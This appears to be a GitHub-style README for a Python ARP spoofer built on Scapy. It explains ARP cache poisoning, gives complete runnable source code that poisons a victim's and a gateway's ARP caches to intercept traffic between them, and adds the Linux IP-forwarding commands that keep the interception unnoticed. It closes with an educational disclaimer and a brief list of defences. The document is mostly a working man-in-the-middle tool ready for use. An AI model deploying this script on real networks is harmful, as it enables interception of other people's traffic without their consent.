# Python ARP Spoofer

A lightweight Python script utilizing **Scapy** for demonstration and educational analysis of **Address Resolution Protocol (ARP) Cache Poisoning** (Man-in-the-Middle attack dynamics) on a local area network (LAN).

> **Disclaimer**: This tool is provided strictly for educational purposes and authorized penetration testing on network infrastructure you own or have explicit permission to test. Unauthorized ARP spoofing on a network is illegal.

---

## Overview

The Address Resolution Protocol (ARP) translates IP addresses (Network Layer) into physical MAC addresses (Data Link Layer). Because the standard ARP protocol lacks built-in authentication mechanism, network devices accept unsolicited ARP responses and update their internal ARP cache tables accordingly.

This script demonstrates how an unauthorized host can:
1. Impersonate the default network gateway to a target victim.
2. Impersonate the target victim to the network gateway.
3. Intercept local network traffic flowing between the victim and the gateway.
4. Restore original network bindings upon termination to ensure proper network hygiene.

---

## Prerequisites

* **Operating System**: Linux / Unix (recommended)
* **Python**: 2.7 / 3.x
* **Dependencies**: `scapy`
* **Privileges**: Root / Superuser privileges required for raw packet manipulation and network interface binding.

### Installation

Install Scapy via `pip`:

```bash
pip install scapy
```

---

## How It Works

### Core Functions

1. **`get_mac(ip)`**
   Sends an ARP request broadcast packet (`Ether(dst="ff:ff:ff:ff:ff:ff")`) to resolve the hardware MAC address corresponding to a given target IP address.

2. **`spoof(target_ip, spoof_ip)`**
   Crafts an unsolicited ARP response packet (`op=2`) claiming that the machine running the script holds the IP address specified in `spoof_ip`.

3. **`restore(destination_ip, source_ip)`**
   Sends legitimate ARP packets containing correct hardware-to-IP mappings back to both the victim and gateway to clean up ARP tables when exiting.

---

## Source Code

```python
#!/usr/bin/env python
import sys
import time
import scapy.all as scapy

def get_victim():
    ip = input("Enter the IP of the target: ")
    return ip

def get_gateway():
    ip = input("Enter the IP of the router: ")
    return ip

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = get_victim()
    gateway_ip = get_gateway()

    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
```

---

## Network Requirements & Linux Setup

For the target machine to maintain continuous internet connectivity while traffic is intercepted, **IP Forwarding** must be enabled on the host system running the script:

```bash
# Enable IPv4 packet forwarding on Linux
sudo sysctl -w net.ipv4.ip_forward=1
```

To disable forwarding after testing:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

---

## Defensive Countermeasures

* **Dynamic ARP Inspection (DAI)**: Configure enterprise switches to validate ARP packets against a trusted DHCP snooping database.
* **Static ARP Entries**: Bind critical network hosts (e.g., default gateways) statically using `arp -s <IP> <MAC>`.
* **Transport Encryption**: Utilize end-to-end encryption protocols (TLS/HTTPS, SSH, VPNs) to render intercepted data unreadable.
